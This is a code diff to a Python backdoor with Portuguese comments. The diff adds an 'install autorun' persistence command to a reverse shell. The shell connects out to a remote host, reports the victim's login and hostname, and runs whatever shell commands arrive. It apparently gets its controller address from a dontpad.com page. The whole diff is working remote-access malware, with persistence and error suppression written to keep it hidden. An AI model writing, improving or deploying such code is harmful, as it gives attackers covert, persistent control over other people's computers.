@@ -7,16 +7,23 @@ import subprocess
 from time import sleep
 import requests
 from threading import Thread
+from sys import argv
 
 
 def shell(sock):
+    global pathsys
     while True:
         cmd = sock.recv(1024)
-        proc = subprocess.Popen(cmd.decode(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-        output = proc.stdout.read()
-        output += proc.stderr.read()
+        command = cmd.decode()
+        output = b''
+        if command == 'install autorun':
+            if pathsys is not None:
+                Thread(target=autorun, args=(pathsys,)).start()
+        else:
+            proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            output += proc.stdout.read()
+            output += proc.stderr.read()
         output += b'\n[+] Executado'
-
         data = output.decode('latin-1').encode()
         sock.send(data)
 
@@ -27,9 +34,7 @@ def session(ip, port):
         sock.connect((ip, port))
         sock.send(f'{os.getlogin()}@{platform.node()}'.encode())
         shell(sock)
-
-    except Exception as err:
-        # print(err)
+    except Exception:
         return 0
 
 
@@ -47,9 +52,12 @@ def autorun(file):
 
 # Função principal
 if __name__ == '__main__':
-
-    Thread(target=autorun, args=(__file__,)).start()
-
+    pathsys = None
+    if len(argv) >= 1:
+        if os.path.exists(argv[0]):
+            if os.path.isfile(argv[0]):
+                pathsys = argv[0]
+                Thread(target=autorun, args=(pathsys,)).start()
     while True:
         try:
             endpoint = requests.get('http://dontpad.com/hell0')
